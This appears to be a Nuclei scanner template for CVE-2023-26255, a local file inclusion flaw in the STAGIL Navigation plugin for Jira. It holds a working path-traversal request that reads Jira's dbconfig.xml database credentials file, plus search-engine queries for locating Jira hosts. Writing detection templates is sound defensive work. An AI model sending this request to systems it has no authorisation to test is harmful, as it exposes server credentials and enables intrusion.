id: CVE-2023-26255

info:
  name: STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion
  author: DhiyaneshDK
  severity: high
  description: |
    STAGIL Navigation for Jira Menu & Themes plugin before 2.0.52 is susceptible to local file inclusion via modifying the fileName parameter to the snjCustomDesignConfig endpoint. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can potentially allow the attacker to steal cookie-based authentication credentials and launch other attacks.
  impact: |
    An attacker can exploit this vulnerability to read sensitive files on the server.
  remediation: |
    Upgrade STAGIL Navigation for Jira Menu & Themes to version 2.0.52 or higher to fix the Local File Inclusion vulnerability.
  reference:
    - https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26255.md
    - https://marketplace.atlassian.com/apps/1216090/stagil-navigation-for-jira-menus-themes?tab=overview&hosting=cloud
    - https://nvd.nist.gov/vuln/detail/CVE-2023-26255
    - https://github.com/nomi-sec/PoC-in-GitHub
    - https://github.com/tucommenceapousser/CVE-2023-26255-Exp
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-26255
    cwe-id: CWE-22
    epss-score: 0.93558
    epss-percentile: 0.99819
    cpe: cpe:2.3:a:stagil:stagil_navigation:*:*:*:*:*:jira:*:*
  metadata:
    max-request: 1
    vendor: stagil
    product: stagil_navigation
    framework: jira
    shodan-query:
      - title:Jira
      - http.title:jira
    fofa-query: title=jira
    google-query: intitle:jira
  tags: cve2023,cve,lfi,jira,cms,atlassian,stagil,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<jira-database-config>"

      - type: word
        part: header
        words:
          - '$textMime'

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100e17fbd9e1c16e9eb1867ee37ed651a775e34f74aed4423166c517474c266631d022100f038091c389ade99b28ff3dbc73f3670303968f97a158d7087a8d954c27c5d4a:922c64590222798bb761d5b6d8e72950